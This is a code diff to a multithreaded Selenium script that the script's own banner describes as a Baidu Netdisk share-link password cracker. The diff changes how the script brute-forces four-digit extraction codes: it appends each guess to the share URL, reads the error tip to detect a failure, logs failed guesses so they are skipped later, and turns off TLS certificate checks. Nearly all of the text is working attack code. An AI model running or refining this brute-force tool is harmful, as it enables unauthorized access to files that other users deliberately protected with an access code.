@@ -2,7 +2,8 @@ from selenium import webdriver
 from selenium.webdriver.common import utils
 import os
 import platform as pf
-import time,re
+import time
+import re
 import urllib,threading,ssl,time,random,http.cookiejar
 ssl._create_default_https_context=ssl._create_unverified_context
 
@@ -16,21 +17,24 @@ pwddict=[]
 totpwd=0
 srctot=0
 proxy = {'https':''}
+
 def loaddict():
-    ignorelist={}
-    fp = open(pwdfile, "r")
-    for line in fp:
-        ignorelist[line.strip('\n')]=0
-    fp.close()
-    if ignorepwdfile:
-        fp = open(ignorepwdfile, "r")
-        for line in fp:
-            ignorelist[line.strip('\n')]=1
-        fp.close()
-    for i in ignorelist:
-        if ignorelist[i]==0:
-            pwddict.append(i)
+    ignorelist = {}
+    # Load all failed passwords into ignorelist
+    if os.path.exists(ignorepwdfile):  # Check if log2.dic exists
+        with open(ignorepwdfile, "r") as fp:
+            for line in fp:
+                ignorelist[line.strip()] = 1  # Mark as failed
     
+    # Read the main password dictionary
+    with open(pwdfile, "r") as fp:
+        for line in fp:
+            password = line.strip()
+            if password not in ignorelist:  # Exclude failed passwords
+                pwddict.append(password)
+    
+    print(f"Loaded {len(pwddict)} passwords after excluding failed ones.")
+
 print("===========")
 print("百度网盘分享文件密码破解器 by MXWXZ   最后测试于2018年5月9日)")
 # url=input("请输入URL地址（https://pan.baidu.com/share/init?xxx）：")
@@ -67,16 +71,20 @@ def GetPwd():
         num=random.randint(0,totpwd-1)
         ret=pwddict[num]
         del pwddict[num]
-        print("剩余密码数：",totpwd, end="\r")
+        # print("剩余密码数：",totpwd, end="\r")
+        # if totpwd % 100 == 0:
+        #     time.sleep(random.randint(3, 5))
+        print("剩余密码数：",totpwd)
         totpwd-=1
         pwdlock.release()
         return ret
 # options = webdriver.ChromeOptions()
-# 无头浏览器，不弹出图形界面，注释后会弹出图形界面
-# options.add_argument('--headless')
 
 # use Edge instead 
 options = webdriver.EdgeOptions()
+
+# 无头浏览器，不弹出图形界面，注释后会弹出图形界面
+# options.add_argument('--headless')
 
 options.add_argument('--no-sandbox')
 # selenium会输出大量日志，这里将其金庸
@@ -154,29 +162,57 @@ def fuck():
 
         driver = webdriver.Edge(options=options)
         # url="https://pan.baidu.com/share/init?surl=t5fahahxsAZvNZ0jujrQKQ"
-        driver.get(url)
+        pwd_url = url + f"&pwd={str(trying).zfill(4)}"
+        driver.get(pwd_url)
+        print("Test for url: {}".format(url))
         # 直接打开网址显示没有，需要刷新一次
-        driver.refresh()
+        # driver.refresh()
         # time.sleep(5)
         
         # 有时候会出现无法找到id="zkGv3a"元素的错误
         # 因为网页加载慢，等待一分钟，如何依旧没有，关闭浏览器，进入下次循环
         # <div id="xbwNKkN" style="display: block;">提取码错误</div>
         try:
-            driver.find_element_by_id("accessCode").send_keys(trying)
-            driver.find_element_by_class_name("text").click()
-            time.sleep(random.randint(2,3))
-            tmp = WebDriverWait(driver, 60).until(
-            EC.presence_of_element_located((By.ID, element_id)))
-            tmp1 =  WebDriverWait(driver, 60).until(
-            EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/div[2]/div[1]")))
-        except  Exception:
+            # driver.find_element_by_id("accessCode").send_keys(trying)
+            # driver.find_element_by_class_name("text").click()
+            # time.sleep(random.randint(2,3))
+            # tmp = WebDriverWait(driver, 60).until(
+            # EC.presence_of_element_located((By.ID, element_id)))
+            # tmp1 =  WebDriverWait(driver, 60).until(
+            # EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/div[2]/div[1]")))
+
+            # Assuming driver is already defined and initialized
+            # driver.find_element(By.ID, "accessCode").send_keys(trying)
+
+            # driver.find_element(By.ID, "submitBtn").click()
+            # refDiv = WebDriverWait(driver, 60).until(
+            #     EC.presence_of_element_located((By.CLASS_NAME, "verify-friend"))
+            # )
+            # submitBtn = WebDriverWait(driver, 60).until(
+            #     EC.presence_of_element_located((By.ID, "submitBtn"))
+            # )
+            # submitBtn.click()
+
+            # Wait for random delay to simulate human interaction
+            # time.sleep(random.randint(2, 3))
+
+            # # Wait until the element with the specified ID is present
+            # tmp = WebDriverWait(driver, 60).until(
+            #     EC.presence_of_element_located((By.ID, element_id))
+            # )
+
+            # Wait until the element with the specified class name is present
+            tipDiv = WebDriverWait(driver, 60).until(
+                EC.presence_of_element_located((By.CLASS_NAME, "tip"))
+            ) 
+        except  Exception as e:
+            print(e)
             driver.quit()
             continue
 
         # tmp=driver.find_element_by_id("zkGv3a")
         # time.sleep(10)
-        text = tmp1.get_attribute("innerText")
+        text = tipDiv.get_attribute("innerText")
         print( time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) ,": %s"%trying,text)
         # fp = open("log2.dic", "a")
         # if fp.tell()!=0:
@@ -187,10 +223,8 @@ def fuck():
         driver.quit()
         if "提取码错误"== text or not driver.current_url.startswith(start_head): 
             if filelock.acquire(True):
-                fp = open("log2.dic", "a")
-                if fp.tell()!=0:
-                    fp.write("\n")
-                fp.write(trying)
+                fp = open(ignorepwdfile, "a")
+                fp.write(f"{trying}\n")
                 fp.close()
                 filelock.release()
         elif driver.current_url.startswith(start_head):
@@ -211,7 +245,7 @@ def fuck():
             # 再次确认提取码的正确性
             if check(trying) == False:
                 if filelock.acquire(True):
-                    fp = open("log2.dic", "a")
+                    fp = open(ignorepwdfile, "a")
                     if fp.tell()!=0:
                         fp.write("\n")
                     fp.write(trying)
@@ -233,3 +267,4 @@ if __name__=="__main__":
     for i in range(int(threadnum)):
         threadid.append(threading.Thread(target = fuck, args=()))
         threadid[i].start()
+        # fuck()
